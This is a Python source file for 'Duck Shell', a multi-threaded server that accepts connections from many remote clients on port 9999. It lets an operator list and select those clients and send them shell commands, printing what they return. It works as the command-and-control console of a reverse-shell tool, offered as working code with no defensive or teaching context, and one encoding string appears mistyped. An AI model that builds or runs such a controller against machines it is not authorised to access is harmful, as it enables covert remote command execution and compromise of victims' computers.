#Duck Shell (Multi Threaded) - Server
#Created by Nafis Hasnian Rafi

import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connections = []
all_addresses = []


# Create socket (allows two computer to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))



# Bind socket to port and wait connection from the client
def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying .....")
        time.sleep(5)
        socket_bind()



#Accept connections from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConnection has been established " + address[0] + "\nType list or select [x] to list or select clients")
        except:
            print("Error accepting connections")


# Interactive prompt for sending commands remotely
def start_duck():
    while True:
        cmd = input('duck_shell> ')
        if cmd == 'list':
            list_connections()
            continue
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

#Displays all current connections
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '  ' + str(all_addresses[i][0]) + '  ' + str(all_addresses[i][1]) + '\n'

    print('----Clients----' + '\n' + results)


def get_target(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn

    except:
        print("Not a valid selection")
        return None

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf -8")
                print(client_response, end="")
            if cmd == "quit" :
                break

        except:
            print("Connection was lost")
            break

# Create threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Do the next job in the queue for sending connections and sending commands
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_duck()
        queue.task_done()


#Each list item is a new job
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

create_workers()
create_jobs()




